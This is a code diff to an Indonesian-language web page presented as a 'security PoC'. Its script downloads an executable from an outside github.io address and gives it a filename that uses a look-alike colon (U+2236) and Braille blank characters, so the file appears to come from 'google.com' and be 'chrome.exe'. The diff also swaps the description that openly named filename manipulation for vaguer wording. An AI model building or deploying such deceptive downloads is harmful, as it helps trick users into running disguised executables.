@@ -72,7 +72,7 @@
 
     <div class="card">
         <h2>Download UI Layout Security PoC</h2>
-        <p>Uji coba simulasi manipulasi nama file menggunakan karakter Unicode <code>U+2236</code> (Ratio) & <code>U+2800</code> (Braille Blank).</p>
+        <p>Uji coba simulasi unduhan menggunakan payload URL kustom yang menyematkan karakter Unicode khusus.</p>
         
         <button onclick="triggerDownloadPoC()">Mulai Unduhan Payload</button>
 
@@ -86,11 +86,9 @@
         }
 
         function triggerDownloadPoC() {
-            // URL target spesifik sesuai permintaan Anda yang menyematkan payload Unicode
+            // Menggunakan tautan payload Anda secara langsung
             const targetUrl = "https://ecdnts-del.github.io/test-apk/From%E2%88%B6%20google.com%20%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%E2%A0%80%20chrome.exe";
-            
-            // Nama file yang merepresentasikan hasil decode dari URL tersebut
-            const craftedFilename = "From∶ google.com ⠀⠀                      ⠀⠀⠀⠀ chrome.exe";
+            const craftedFilename = "From∶ google.com ⠀⠀⠀⠀⠀⠀ chrome.exe";
 
             updateStatus("Memicu unduhan dengan payload kustom...", targetUrl);
 
